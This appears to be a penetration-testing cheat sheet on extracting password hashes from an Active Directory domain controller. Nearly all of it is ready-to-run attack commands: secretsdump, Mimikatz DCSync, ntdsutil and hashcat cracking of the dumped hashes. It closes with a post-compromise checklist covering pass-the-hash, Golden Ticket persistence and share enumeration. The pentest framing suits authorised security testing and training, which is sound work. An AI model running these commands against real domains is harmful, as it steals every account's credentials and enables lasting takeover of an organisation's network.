# Dumping NTDS.dit

## What Is NTDS.dit?

The Active Directory database stored on every Domain Controller. Contains:
- All user accounts
- All group memberships
- Security descriptors
- **All password hashes for every domain account**

Location: `%SystemRoot%\NTDS\ntds.dit`

---

## secretsdump (Impacket) — Recommended

```sh
# Full dump (all hashes, Kerberos keys, cleartext if available)
secretsdump.py DOMAIN/user:'Password'@<DC-IP>

# NTLM hashes only (faster, cleaner)
secretsdump.py DOMAIN/user:'Password'@<DC-IP> -just-dc-ntlm

# Using hash authentication
secretsdump.py DOMAIN/user@<DC-IP> -hashes :<NTLM-hash> -just-dc-ntlm
```

Output format:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
Format: `user:RID:LM-hash:NT-hash:::`

---

## Cracking NTDS Hashes

Extract only the NT hash (second half after the third colon):

```sh
# Crack NT hashes (hashcat mode 1000 = NTLM)
hashcat -m 1000 ntds_hashes.txt /usr/share/wordlists/rockyou.txt

# Show already cracked
hashcat -m 1000 ntds_hashes.txt /usr/share/wordlists/rockyou.txt --show
```

---

## Via Mimikatz (DCSync)

```sh
# Dump all hashes without touching the NTDS.dit file
lsadump::dcsync /domain:domain.local /all /csv

# Single user
lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## Via ntdsutil (Windows — From DC)

```cmd
ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q
```

---

## What to Do After

1. Crack hashes with hashcat
2. Pass the Hash for any accounts that cannot be cracked
3. Create Golden Ticket with krbtgt hash for persistence
4. Enumerate shares for sensitive data
5. **Delete any accounts you created** during the engagement
6. Document everything for the report

---

## Post-Domain Compromise Checklist

- [ ] Dump NTDS.dit
- [ ] Crack hashes (Administrator + high-value accounts)
- [ ] Enumerate shares: `netexec smb <cidr> -u admin -H <hash> --shares`
- [ ] Create Golden Ticket for persistence (if needed)
- [ ] Delete any test accounts created
